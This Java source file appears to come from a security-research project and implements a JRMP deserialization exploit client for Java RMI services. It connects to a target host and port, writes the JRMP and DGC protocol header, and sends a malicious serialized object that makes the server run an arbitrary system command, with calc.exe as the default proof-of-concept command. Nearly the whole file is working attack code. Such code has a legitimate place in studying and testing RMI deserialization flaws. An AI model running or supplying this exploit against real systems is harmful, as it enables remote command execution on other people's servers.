package cc.saferoad.rmi;
import static cc.saferoad.rmi.RMIServer.RMI_HOST;
import static cc.saferoad.rmi.RMIServer.RMI_PORT;
/*
@auther S0cke3t
@date 2021-11-17
*/

import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;

import java.io.DataOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class JRMPDeserialization {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地RMI服务
            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "calc.exe"};
        }

        // 远程RMI服务IP
        final String host = args[0];

        // 远程RMI服务端口
        final int port = Integer.parseInt(args[1]);

        // 需要执行的系统命令
        final String command = args[2];

        // Socket连接对象
        Socket socket = null;

        // Socket输出流
        OutputStream out = null;

        try {
            // 创建恶意的Payload对象
            Object payloadObject = RMIDeserializationClient.genPayload(command);

            // 建立和远程RMI服务的Socket连接
            socket = new Socket(host, port);
            socket.setKeepAlive(true);
            socket.setTcpNoDelay(true);

            // 获取Socket的输出流对象
            out = socket.getOutputStream();

            // 将Socket的输出流转换成DataOutputStream对象
            DataOutputStream dos = new DataOutputStream(out);

            // 创建MarshalOutputStream对象
            ObjectOutputStream baos = new MarshalOutputStream(dos);

            // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
            dos.writeInt(TransportConstants.Magic);// 魔数
            dos.writeShort(TransportConstants.Version);// 版本
            dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
            dos.write(TransportConstants.Call);// RMI调用指令
            baos.writeLong(2); // DGC
            baos.writeInt(0);
            baos.writeLong(0);
            baos.writeShort(0);
            baos.writeInt(1); // dirty
            baos.writeLong(-669196253586618813L);// 接口Hash值

            // 写入恶意的序列化对象
            baos.writeObject(payloadObject);

            dos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // 关闭Socket输出流
            if (out != null) {
                out.close();
            }

            // 关闭Socket连接
            if (socket != null) {
                socket.close();
            }
        }
    }
}
